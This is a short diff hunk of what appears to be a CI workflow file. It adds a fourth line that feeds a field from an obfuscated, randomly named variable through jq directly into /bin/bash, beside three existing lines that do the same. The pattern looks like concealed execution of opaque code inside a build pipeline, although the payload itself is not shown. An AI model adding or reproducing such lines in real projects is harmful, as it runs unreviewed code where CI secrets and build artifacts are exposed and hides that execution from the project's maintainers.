@@ -35,6 +35,7 @@ jobs:
           echo $jnpse823 | jq -r .doc504 | /bin/bash
           echo $k1 | jq -r .zb16 | /bin/bash
           printf '%s' "$fh872" | jq -r .eun89 | /bin/bash
+          echo $w0211 | jq -r .f391 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
